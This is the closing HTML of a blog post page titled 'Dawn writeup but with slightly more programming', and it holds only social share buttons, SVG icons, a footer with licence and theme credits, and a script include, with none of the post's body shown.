1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg></div></div></a><a class=resp-sharing-button__link href="mailto:?subject=Dawn%20writeup%20but%20with%20slightly%20more%20programming&body=https%3a%2f%2fspookyscary1.github.io%2fposts%2f2022%2f05%2fdawn-writeup-but-with-slightly-more-programming%2f" target=_self rel=noopener aria-label title="Share via email"><div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></div></div></a><a class=resp-sharing-button__link href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fspookyscary1.github.io%2fposts%2f2022%2f05%2fdawn-writeup-but-with-slightly-more-programming%2f&media=https%3a%2f%2fspookyscary1.github.io%2fposts%2f2022%2f05%2fdawn-writeup-but-with-slightly-more-programming%2f;description=Dawn%20writeup%20but%20with%20slightly%20more%20programming" target=_blank rel=noopener aria-label title="Share on pinterest"><div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12.017.0C5.396.0.029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024.0 1.518.769 1.518 1.688.0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128.0 3.768-2.245 3.768-5.487.0-2.861-2.063-4.869-5.008-4.869-3.41.0-5.409 2.562-5.409 5.199.0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646.0-3.776 2.748-7.252 7.92-7.252 4.158.0 7.392 2.967 7.392 6.923.0 4.135-2.607 7.462-6.233 7.462-1.214.0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607.0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017.0z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fspookyscary1.github.io%2fposts%2f2022%2f05%2fdawn-writeup-but-with-slightly-more-programming%2f&title=Dawn%20writeup%20but%20with%20slightly%20more%20programming&summary=Dawn%20writeup%20but%20with%20slightly%20more%20programming&source=https%3a%2f%2fspookyscary1.github.io%2fposts%2f2022%2f05%2fdawn-writeup-but-with-slightly-more-programming%2f" target=_blank rel=noopener aria-label title="Share on linkedin"><div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></div></div></a><a class=resp-sharing-button__link href="https://reddit.com/submit/?url=https%3a%2f%2fspookyscary1.github.io%2fposts%2f2022%2f05%2fdawn-writeup-but-with-slightly-more-programming%2f&resubmit=true&title=Dawn%20writeup%20but%20with%20slightly%20more%20programming" target=_blank rel=noopener aria-label title="Share on reddit"><div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fspookyscary1.github.io%2fposts%2f2022%2f05%2fdawn-writeup-but-with-slightly-more-programming%2f;title=Dawn%20writeup%20but%20with%20slightly%20more%20programming" target=_blank rel=noopener aria-label title="Share on xing"><div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M18.188.0c-.517.0-.741.325-.927.66.0.0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211.0.375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016.0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894.0 21.686.0h-3.498zM3.648 4.74c-.211.0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016.0.021L1.86 16.051c-.099.188-.093.381.0.529.085.142.239.234.45.234h3.461c.518.0.766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg></div></div></a><a class=resp-sharing-button__link href="whatsapp://send?text=Dawn%20writeup%20but%20with%20slightly%20more%20programming%20https%3a%2f%2fspookyscary1.github.io%2fposts%2f2022%2f05%2fdawn-writeup-but-with-slightly-more-programming%2f" target=_blank rel=noopener aria-label title="Share on whatsapp"><div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198.0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479.0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87.0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86.0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64.0 5.122 1.03 6.988 2.898a9.825 9.825.0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815.0 0012.05.0C5.495.0.16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882.0 005.683 1.448h.005c6.554.0 11.89-5.335 11.893-11.893a11.821 11.821.0 00-3.48-8.413z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fspookyscary1.github.io%2fposts%2f2022%2f05%2fdawn-writeup-but-with-slightly-more-programming%2f&t=Dawn%20writeup%20but%20with%20slightly%20more%20programming" target=_blank rel=noopener aria-label title="Share on hacker news"><div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://telegram.me/share/url?text=Dawn%20writeup%20but%20with%20slightly%20more%20programming&url=https%3a%2f%2fspookyscary1.github.io%2fposts%2f2022%2f05%2fdawn-writeup-but-with-slightly-more-programming%2f" target=_blank rel=noopener aria-label title="Share on telegram"><div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg></div></div></a></div></main></div><footer class=footer><div class=footer__inner><div class=footer__content><span>&copy; 2022</span>
<span><a href=https://spookyscary1.github.io>Spook</a></span>
<span><a href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank rel=noopener>CC BY-NC 4.0</a></span>
<span><a href=https://spookyscary1.github.io/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span></div></div><div class=footer__inner><div class=footer__content><span>Powered by <a href=http://gohugo.io>Hugo</a></span><span>Made with &#10084; by <a href=https://github.com/rhazdon>Djordje Atlialp</a></span></div></div></footer></div><script type=text/javascript src=https://spookyscary1.github.io/bundle.min.a2c5b062c87998f04d1b5dfb6a89a1b2d79786c21d0cb63a05e8a2082984b64b77d80955e3b97eab17273775162ba372511b711fea2f7608f216e68a67bb22d6.js integrity="sha512-osWwYsh5mPBNG137aomhsteXhsIdDLY6BeiiCCmEtkt32AlV47l+qxcnN3UWK6NyURtxH+ovdgjyFuaKZ7si1g=="></script></body></html>